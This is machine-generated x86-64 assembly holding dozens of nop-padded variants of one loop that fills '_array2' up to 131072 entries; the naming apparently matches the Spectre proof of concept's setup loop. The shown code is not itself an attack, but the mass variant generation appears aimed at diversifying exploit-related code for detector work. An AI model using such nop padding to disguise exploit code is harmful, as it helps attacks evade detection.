	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 58
.Lmain_win6_var58:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 59
.Lmain_win6_var59:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 60
.Lmain_win6_var60:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 61
.Lmain_win6_var61:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 62
.Lmain_win6_var62:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 63
.Lmain_win6_var63:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 64
.Lmain_win6_var64:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 65
.Lmain_win6_var65:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 66
.Lmain_win6_var66:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 67
.Lmain_win6_var67:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 68
.Lmain_win6_var68:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 69
.Lmain_win6_var69:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 70
.Lmain_win6_var70:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 71
.Lmain_win6_var71:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 72
.Lmain_win6_var72:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 73
.Lmain_win6_var73:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 74
.Lmain_win6_var74:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 75
.Lmain_win6_var75:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 76
.Lmain_win6_var76:
	popq	%rax
	nop
	nop
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 77
.Lmain_win6_var77:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 78
.Lmain_win6_var78:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 79
.Lmain_win6_var79:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 80
.Lmain_win6_var80:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 81
.Lmain_win6_var81:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	nop
	jmp	.Lmain_win6_continue
## Variant 82
.Lmain_win6_var82:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 83
.Lmain_win6_var83:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 84
.Lmain_win6_var84:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 85
.Lmain_win6_var85:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 86
.Lmain_win6_var86:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 87
.Lmain_win6_var87:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 88
.Lmain_win6_var88:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 89
.Lmain_win6_var89:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 90
.Lmain_win6_var90:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 91
.Lmain_win6_var91:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 92
.Lmain_win6_var92:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 93
.Lmain_win6_var93:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 94
.Lmain_win6_var94:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 95
.Lmain_win6_var95:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 96
.Lmain_win6_var96:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 97
.Lmain_win6_var97:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 98
.Lmain_win6_var98:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 99
.Lmain_win6_var99:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 100
.Lmain_win6_var100:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 101
.Lmain_win6_var101:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 102
.Lmain_win6_var102:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	nop
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 103
.Lmain_win6_var103:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 104
.Lmain_win6_var104:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 105
.Lmain_win6_var105:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 106
.Lmain_win6_var106:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 107
.Lmain_win6_var107:
	popq	%rax
	nop
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 108
.Lmain_win6_var108:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 109
.Lmain_win6_var109:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 110
.Lmain_win6_var110:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
	nop
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 111
.Lmain_win6_var111:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 112
.Lmain_win6_var112:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 113
.Lmain_win6_var113:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 114
.Lmain_win6_var114:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 115
.Lmain_win6_var115:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 116
.Lmain_win6_var116:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 117
.Lmain_win6_var117:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 118
.Lmain_win6_var118:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 119
.Lmain_win6_var119:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	movl	-60(%rbp), %eax
	nop
	jmp	.Lmain_win6_continue
## Variant 120
.Lmain_win6_var120:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
	nop
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	movq	_array2@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-60(%rbp), %eax
	jmp	.Lmain_win6_continue
## Variant 121
.Lmain_win6_var121:
	popq	%rax
	cmpl	$131072, -60(%rbp)    # # imm = 0x20000
	jge	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	movq	_array2@GOTPCREL(%rip), %rax
	nop
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
